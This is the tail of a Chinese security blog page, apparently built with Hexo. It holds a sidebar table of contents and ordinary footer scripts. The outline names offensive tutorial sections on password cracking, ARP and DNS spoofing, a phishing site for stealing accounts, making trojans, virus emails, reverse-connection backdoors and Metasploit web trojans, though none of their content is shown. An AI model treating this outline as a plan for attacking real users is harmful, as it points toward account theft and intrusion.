<span class="nav-text">web扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#httrack"><span class="nav-number">3.1.</span> <span class="nav-text">httrack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#owasp-zap"><span class="nav-number">3.2.</span> <span class="nav-text">owasp-zap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#skipfish"><span class="nav-number">3.3.</span> <span class="nav-text">skipfish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#whatweb"><span class="nav-number">3.4.</span> <span class="nav-text">whatweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nessus"><span class="nav-number">3.5.</span> <span class="nav-text">Nessus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medusa"><span class="nav-number">3.6.</span> <span class="nav-text">medusa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hydra"><span class="nav-number">3.7.</span> <span class="nav-text">hydra</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NCrack"><span class="nav-number">4.</span> <span class="nav-text">NCrack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hashcat"><span class="nav-number">4.1.</span> <span class="nav-text">hashcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rarcrack"><span class="nav-number">4.2.</span> <span class="nav-text">rarcrack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fcrackzip"><span class="nav-number">4.3.</span> <span class="nav-text">fcrackzip</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#密码生成"><span class="nav-number">5.</span> <span class="nav-text">密码生成</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cewl"><span class="nav-number">5.1.</span> <span class="nav-text">cewl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crunch"><span class="nav-number">5.2.</span> <span class="nav-text">crunch</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安卓逆向"><span class="nav-number">6.</span> <span class="nav-text">安卓逆向</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#apktool"><span class="nav-number">6.1.</span> <span class="nav-text">apktool</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dex2jar"><span class="nav-number">6.2.</span> <span class="nav-text">dex2jar</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#内网安全"><span class="nav-number">7.</span> <span class="nav-text">内网安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#arp欺骗"><span class="nav-number">7.1.</span> <span class="nav-text">arp欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dns欺骗"><span class="nav-number">7.2.</span> <span class="nav-text">dns欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#钓鱼网站盗取账号"><span class="nav-number">7.2.1.</span> <span class="nav-text">钓鱼网站盗取账号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#可执行木马制作"><span class="nav-number">7.2.2.</span> <span class="nav-text">可执行木马制作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取图片流量"><span class="nav-number">7.2.3.</span> <span class="nav-text">获取图片流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#病毒邮件"><span class="nav-number">7.2.4.</span> <span class="nav-text">病毒邮件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powser-攻击向量"><span class="nav-number">7.2.5.</span> <span class="nav-text">powser 攻击向量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统后门"><span class="nav-number">7.2.6.</span> <span class="nav-text">系统后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#正向连接"><span class="nav-number">7.2.6.1.</span> <span class="nav-text">正向连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反向连接"><span class="nav-number">7.2.6.2.</span> <span class="nav-text">反向连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#持续访问"><span class="nav-number">7.2.7.</span> <span class="nav-text">持续访问</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msfconsole"><span class="nav-number">7.3.</span> <span class="nav-text">msfconsole</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#网页木马1"><span class="nav-number">7.3.1.</span> <span class="nav-text">网页木马1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网页木马2"><span class="nav-number">7.3.2.</span> <span class="nav-text">网页木马2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#应用程序木马"><span class="nav-number">7.3.3.</span> <span class="nav-text">应用程序木马</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2015 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AsherCode</span>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共79.7k字</span>
+</div>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      本站访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      本站总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.3"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("mvlpA2l2DQuXENSGQgGyvWEx-gzGzoHsz", "BPLBwOm9OSqs2LtI5jIHvcSW");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "default";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "default";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: -30px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: 40px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+</body>
+</html>
+<!-- ҳ������С���� -->
+<script type="text/javascript" src="/js/src/love.js"></script>
